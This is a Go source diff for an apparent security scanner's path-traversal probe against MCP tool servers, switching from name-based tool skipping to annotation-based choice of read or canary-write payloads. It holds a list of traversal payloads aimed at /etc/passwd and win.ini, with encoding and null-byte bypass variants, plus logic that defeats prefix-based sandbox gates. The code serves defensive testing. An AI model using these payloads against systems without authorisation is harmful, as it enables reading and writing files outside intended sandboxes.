@@ -23,21 +23,13 @@ var (
 	_ recon.ContextAwareProbe = (*PathTraversal)(nil)
 )
 
-// pathParamRE matches parameter names likely to accept a READABLE filesystem
-// path. Set pathtraversal_all_string_params=true to widen to every string
-// parameter. Deliberately excludes write-oriented names like `output`,
-// `dest`, `target`, `log`, `logfile` — traversal payloads landing in a
-// write sink (e.g. save_report(path, content)) could overwrite files
-// outside the sandbox; the probe stays read-only by construction.
-var pathParamRE = regexp.MustCompile(`(?i)(^|[_\- ])(file|filename|filepath|path|dir|directory|folder|template|resource|include|require|load|read|open|attachment|input)($|[_\- ])`)
-
-// destructiveToolRE matches tool NAMES whose verb strongly implies a
-// side-effect on the filesystem — write, delete, remove, save, update,
-// create, upload, publish. Tools matching this pattern are skipped
-// unconditionally by PathTraversal (see Mauro S1 review) even if their
-// parameter names look read-like. A caller can override with
-// pathtraversal_all_string_params=true when they understand the risk.
-var destructiveToolRE = regexp.MustCompile(`(?i)(^|[_\- ])(write|delete|remove|rm|save|update|create|upload|publish|overwrite|mv|move|copy|rename|append|patch|put)($|[_\- ])`)
+// pathParamRE matches parameter names likely to accept a filesystem path —
+// both READ-oriented (file, filename, filepath, path, dir, ...) and WRITE-
+// oriented (output, dest, target, log, logfile, ...). Which payload class
+// gets sent for a given tool is decided in Probe from the tool's MCP
+// annotations, not from the param name — so restoring the write-oriented
+// names here does NOT put /etc/passwd at overwrite risk.
+var pathParamRE = regexp.MustCompile(`(?i)(^|[_\- ])(file|filename|filepath|path|dir|directory|folder|template|resource|include|require|load|read|open|attachment|input|output|dest|destination|target|log|logfile|save|store|dump|report)($|[_\- ])`)
 
 // hintedPathRE extracts absolute filesystem paths ("/tmp/safe/", "/var/www/",
 // C:\Users\) from a tool's description. Many real gates ("Only files in
@@ -47,96 +39,142 @@ var destructiveToolRE = regexp.MustCompile(`(?i)(^|[_\- ])(write|delete|remove|r
 // without gate awareness can't produce.
 var hintedPathRE = regexp.MustCompile(`(?i)(/[a-z0-9_.-]+(?:/[a-z0-9_.-]+)+/?|[a-z]:\\[a-z0-9_.\\-]+)`)
 
-// pathTraversalPayloads pair a payload string with the specific file signature
-// its output must contain to prove the tool read the target file. Pairing the
-// payload with its expected signature avoids a scenario where a payload happens
-// to succeed against a file whose signature the detector doesn't recognise.
+// pathTraversalPayload pairs a payload string with the signature(s) its
+// output must contain to prove the sink processed it. Two flavours:
+//
+//   - READ payloads: signatures are literal file-content markers
+//     ("root:x:0:0:", "[extensions]"). A tool that reads /etc/passwd and
+//     returns its content matches; a tool that echoes the payload does not.
+//   - WRITE payloads: signatures are a per-run canary marker embedded in the
+//     target path (e.g. `augwrite-<8hex>`). A tool that WRITES a file to
+//     `/tmp/proof-augwrite-<8hex>` and returns a success message echoes the
+//     canary in its response. The path is a novel /tmp file that doesn't
+//     clobber anything, so this proves the write sink without damage.
 type pathTraversalPayload struct {
 	payload    string
 	signatures []string
+	// isWrite marks payloads whose success is the ACT of writing to a
+	// canary /tmp path. Reported separately in class metadata so a
+	// reviewer sees "path-traversal WRITE to /tmp/proof-<canary>" rather
+	// than an ambiguous read-flavoured hit.
+	isWrite bool
 }
 
-// pathTraversalPayloads covers Unix and Windows readable targets and the
-// common encoding tricks (URL, double-URL, backslash traversal, "....//" bypass,
-// null-byte truncation) that get past naive filter loops.
-var pathTraversalPayloads = []pathTraversalPayload{
-	// Unix /etc/passwd — the "root:x:0:0:" signature is stable across every
-	// distribution back to the 90s and never appears in a benign tool response.
+// readPayloads targets well-known readable system files. Signatures are the
+// stable content markers only a real read could produce.
+var readPayloads = []pathTraversalPayload{
+	// Unix /etc/passwd. Cross-platform signatures (macOS's `## User Database`
+	// header, `nobody:*:` and `daemon:*:` shared across distros).
 	{payload: "../../../../../../etc/passwd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
 	{payload: "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
 	{payload: "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
 	{payload: "....//....//....//....//....//....//etc/passwd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
 	{payload: "/etc/passwd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
 	{payload: "file:///etc/passwd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
-	// Node.js pre-8 Buffer null-byte truncation — still surfaces in legacy code.
+	// Node.js pre-8 Buffer null-byte truncation.
 	{payload: "../../../../../../etc/passwd%00.txt", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
-
-	// Unix /etc/hostname — some hardened images ship without a readable passwd
-	// but keep /etc/hostname world-readable. We can't hardcode a value, so use
-	// this as a second-choice target only when combined with a length heuristic
-	// downstream. For now stick to signature-anchored payloads.
-
-	// Windows win.ini — the "[extensions]" or "[fonts]" section header is
-	// present in Windows 3.1 through Windows 11, giving a stable signature.
+	// Windows win.ini. `[extensions]`/`[fonts]` present from Windows 3.1
+	// through Windows 11.
 	{payload: "..\\..\\..\\..\\..\\..\\windows\\win.ini", signatures: []string{"[extensions]", "[fonts]"}},
 	{payload: "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", signatures: []string{"[extensions]", "[fonts]"}},
 	{payload: "C:\\windows\\win.ini", signatures: []string{"[extensions]", "[fonts]"}},
 }
 
-// PathTraversal tests a directly-invokable tool surface for directory
-// traversal in path-like tool parameters. It injects payloads that resolve to
-// well-known system files (Unix /etc/passwd, Windows win.ini) and flags the
-// attempt when the response contains a signature only present in that file's
-// real contents. Because the signature never appears in the payload itself, a
-// tool that merely echoes its argument cannot trigger a false positive — the
-// same design principle as toolsec.Injection.
+// buildWritePayloads generates canary-write payloads for a single tool call.
+// Each returned payload targets `/tmp/proof-augwrite-<canary>` (a novel path
+// that doesn't overwrite anything), with encoding variants matching the
+// read set. The canary hex is fresh per call so parallel runs don't collide
+// and each attempt's success is self-identifying in the response.
+func buildWritePayloads() []pathTraversalPayload {
+	canary := "augwrite-" + randToken()
+	name := "proof-" + canary
+	// Signature: the canary appearing in the tool's response text is the
+	// signal. The path IS the payload, but the canary is a random 16-hex
+	// substring that a tool merely echoing the payload back would still
+	// produce — so echo is a false positive here in a way it isn't for
+	// arithmetic-canary injection. Compensating check: only tools whose
+	// response also contains a success verb (see WritePayloadSuccessRE
+	// in the detector) count.
+	sig := []string{canary}
+	return []pathTraversalPayload{
+		{payload: "/tmp/" + name, signatures: sig, isWrite: true},
+		{payload: "../../../../tmp/" + name, signatures: sig, isWrite: true},
+		{payload: "..%2f..%2f..%2f..%2ftmp%2f" + name, signatures: sig, isWrite: true},
+		{payload: "....//....//....//....//tmp/" + name, signatures: sig, isWrite: true},
+		{payload: "file:///tmp/" + name, signatures: sig, isWrite: true},
+	}
+}
+
+// PathTraversal tests a directly-invokable tool surface for filesystem path
+// traversal. It runs against every tool the shared toolsec policy permits
+// (see internal/probes/toolsec/toolsec.go), selecting the payload flavour
+// from the tool's MCP annotations:
+//
+//   - ReadOnly-annotated tools get READ payloads targeting /etc/passwd and
+//     win.ini; success = file-content signature in the response.
+//   - Everything else (destructive-annotated, or annotation-absent) gets
+//     WRITE payloads targeting a novel /tmp/proof-augwrite-<canary> path;
+//     success = the canary echoed back in the tool's response. This
+//     structurally avoids overwriting sensitive files like /etc/passwd
+//     even when the operator has explicitly opted destructive tools in via
+//     allow_destructive=true.
+//
+// A per-tool description-parser also generates prefix-append variants when
+// the description discloses the allowed sandbox ("Only files in /tmp/safe/"),
+// defeating naive startsWith gates.
 type PathTraversal struct {
 	reconContext
 	allParams bool
+	policy    toolPolicy
 }
 
-// NewPathTraversal constructs the probe.
+// NewPathTraversal reads pathtraversal_all_string_params + the shared
+// tool-safety config keys (allow_destructive, tool_allowlist, tool_denylist).
 func NewPathTraversal(cfg registry.Config) (probes.Prober, error) {
 	return &PathTraversal{
 		allParams: registry.GetBool(cfg, "pathtraversal_all_string_params", false),
+		policy:    newToolPolicy(cfg),
 	}, nil
 }
 
 func (p *PathTraversal) Name() string { return "toolsec.PathTraversal" }
 
 func (p *PathTraversal) Description() string {
-	return "Injects directory-traversal payloads into path-like tool arguments and detects reads of well-known system files (Unix /etc/passwd, Windows win.ini) by matching file-content signatures"
+	return "Tests directly-invokable tools for filesystem path traversal. Read-only tools get /etc/passwd-class payloads detected via file-content signatures; write-capable tools get novel /tmp/proof-<canary> payloads detected via canary echo — non-destructive proof of arbitrary-path writes without overwriting sensitive files."
 }
 
 func (p *PathTraversal) Goal() string {
-	return "Determine whether any directly-invokable tool exposes an unrestricted filesystem-read path traversal sink"
+	return "Determine whether any directly-invokable tool exposes an unrestricted filesystem-path sink, in EITHER read direction (arbitrary file read via traversal) or write direction (writes to attacker-chosen paths outside the intended sandbox), without damaging the target's files."
 }
 
 func (p *PathTraversal) GetPrimaryDetector() string { return "toolsec.PathTraversal" }
 
 func (p *PathTraversal) GetPrompts() []string {
-	out := make([]string, len(pathTraversalPayloads))
-	for i, p := range pathTraversalPayloads {
+	// Only the read set is stable-across-run and useful for report
+	// introspection; write payloads carry per-run canary hex.
+	out := make([]string, len(readPayloads))
+	for i, p := range readPayloads {
 		out[i] = p.payload
 	}
 	return out
 }
 
-// Probe discovers tools, sends each path-traversal payload against each
-// path-like string parameter, and records the file-content signature the
-// detector should hunt for in the response. Returns no attempts (and no error)
-// for targets that expose no invokable tool surface.
+// Probe discovers tools, applies the shared toolsec policy (allow/deny/
+// destructive gate), picks the read-or-write payload set from each tool's
+// annotations, and dispatches. Returns no attempts for non-ToolInvoker
+// targets.
 func (p *PathTraversal) Probe(ctx context.Context, gen types.Generator) ([]*attempt.Attempt, error) {
+	inv, ok := gen.(types.ToolInvoker)
+	if !ok {
+		return nil, fmt.Errorf("toolsec.PathTraversal: target %q does not support direct tool invocation; this probe requires a tool-surface generator such as mcp.MCP", gen.Name())
+	}
+
 	tools, err := p.resolveTools(ctx, gen)
 	if err != nil {
 		return nil, fmt.Errorf("toolsec.PathTraversal: list tools: %w", err)
 	}
+	tools = p.policy.filterTools(p.Name(), tools)
 	if len(tools) == 0 {
-		return nil, nil
-	}
-
-	inv, ok := gen.(types.ToolInvoker)
-	if !ok {
 		return nil, nil
 	}
 
@@ -147,21 +185,17 @@ func (p *PathTraversal) Probe(ctx context.Context, gen types.Generator) ([]*atte
 		if name == "" {
 			continue
 		}
-		// Skip destructive-looking tools unless the operator has opted
-		// into --all mode: a traversal payload landing in a
-		// save/delete/write sink could overwrite files outside the
-		// target's intended scope. This is a hard skip; there's no
-		// signature-based way for the probe to prove a write sink is
-		// safe to hit with attacker input, and read-only path
-		// traversal is the class we're testing anyway.
-		if !p.allParams && destructiveToolRE.MatchString(name) {
-			slog.Info("toolsec.PathTraversal: skipping destructive-looking tool", "tool", name,
-				"reason", "traversal payloads must not reach write/delete sinks; set pathtraversal_all_string_params=true to override")
-			continue
-		}
 		desc, _ := tool["description"].(string)
 		hintedPrefixes := extractHintedPrefixes(desc)
 		params := toolParams(tool)
+
+		// Payload flavour selection. A ReadOnly annotation is the only
+		// unambiguous positive signal that the tool cannot write; anything
+		// else (destructive-annotated OR annotation-absent) uses the
+		// write-safe canary path so we never risk clobbering /etc/passwd
+		// on a write-capable sink.
+		payloads := p.payloadsFor(tool)
+
 		for _, param := range params {
 			if !isStringParam(param.typ) {
 				continue
@@ -170,18 +204,17 @@ func (p *PathTraversal) Probe(ctx context.Context, gen types.Generator) ([]*atte
 				continue
 			}
 			pathParamSeen = true
-			// Base payload set — direct traversal against a gate-less sink.
-			for _, tp := range pathTraversalPayloads {
+			for _, tp := range payloads {
 				attempts = append(attempts, p.callOne(ctx, inv, name, param.name, params, tp))
 			}
 			// Prefix-append variants — defeat `filename.startswith(prefix)`
 			// / `prefix in path` gates that the tool description disclosed.
-			// Each hinted prefix multiplies the base payload set once.
 			for _, prefix := range hintedPrefixes {
-				for _, tp := range pathTraversalPayloads {
+				for _, tp := range payloads {
 					prefixed := pathTraversalPayload{
 						payload:    joinHintedPath(prefix, tp.payload),
 						signatures: tp.signatures,
+						isWrite:    tp.isWrite,
 					}
 					attempts = append(attempts, p.callOne(ctx, inv, name, param.name, params, prefixed))
 				}
@@ -192,6 +225,25 @@ func (p *PathTraversal) Probe(ctx context.Context, gen types.Generator) ([]*atte
 		slog.Warn("toolsec.PathTraversal: no path-like tool parameters found; set pathtraversal_all_string_params=true to test every string parameter", "tools", len(tools))
 	}
 	return attempts, nil
+}
+
+// payloadsFor picks the read or write payload set based on the tool's MCP
+// annotations. The invariant: /etc/passwd (and any read-oriented sensitive
+// file) is only ever the TARGET of a call the server has explicitly
+// annotated as ReadOnly. Everything else — destructive-hinted or
+// annotation-absent — gets write-safe /tmp/proof-<canary> payloads. A
+// server that ships zero annotations therefore never receives a payload
+// that could overwrite /etc/passwd, even if allow_destructive=true opened
+// the policy gate.
+func (p *PathTraversal) payloadsFor(tool map[string]any) []pathTraversalPayload {
+	// Annotations are stored as a VALUE (types.MCPToolAnnotations) on the
+	// tool map by the recon layer's shared shape; see the sibling
+	// toolPolicy.skip method for the same assertion pattern.
+	ann, ok := tool["annotations"].(types.MCPToolAnnotations)
+	if ok && ann.ReadOnly {
+		return readPayloads
+	}
+	return buildWritePayloads()
 }
 
 // extractHintedPrefixes pulls absolute filesystem paths from a tool
@@ -210,9 +262,6 @@ func extractHintedPrefixes(desc string) []string {
 		if p == "" {
 			continue
 		}
-		// Skip URL-like paths ("/api/foo") — they're rarely filesystem
-		// prefixes. Heuristic: at least two path segments and one contains
-		// a filesystem-shaped token.
 		if !looksLikeFSPrefix(p) {
 			continue
 		}
@@ -245,8 +294,6 @@ func looksLikeFSPrefix(p string) bool {
 // payload to a disclosed prefix so a `startswith(prefix)` gate is satisfied
 // but the tool's real filesystem call resolves outside the prefix.
 func joinHintedPath(prefix, payload string) string {
-	// If the payload already begins with a separator, drop it to avoid a
-	// double slash the gate might not match.
 	trimmed := strings.TrimLeft(payload, "/\\")
 	return prefix + trimmed
 }
@@ -259,11 +306,22 @@ func (p *PathTraversal) callOne(ctx context.Context, inv types.ToolInvoker, tool
 	a.Metadata[attempt.MetadataKeyPathTraversalSignatures] = tp.signatures
 	a.Metadata["toolsec.tool"] = tool
 	a.Metadata["toolsec.param"] = param
+	if tp.isWrite {
+		a.Metadata[attempt.MetadataKeyPathTraversalIsWrite] = true
+	}
 
 	res, err := inv.CallTool(ctx, tool, benignArgs(params, param, tp.payload))
 	if err != nil {
 		a.SetError(err)
 		return a
+	}
+	// Surface the tool's own IsError signal so the detector can require a
+	// non-error response for write findings (a "Successfully wrote to
+	// /tmp/proof-<canary>" is the goal; an "Error: unauthorized path
+	// /tmp/proof-<canary>" that just echoes the payload back would be a
+	// false positive without this check).
+	if res.IsError {
+		a.Metadata[attempt.MetadataKeyPathTraversalToolIsError] = true
 	}
 	a.AddOutput(res.Text)
 	a.Complete()
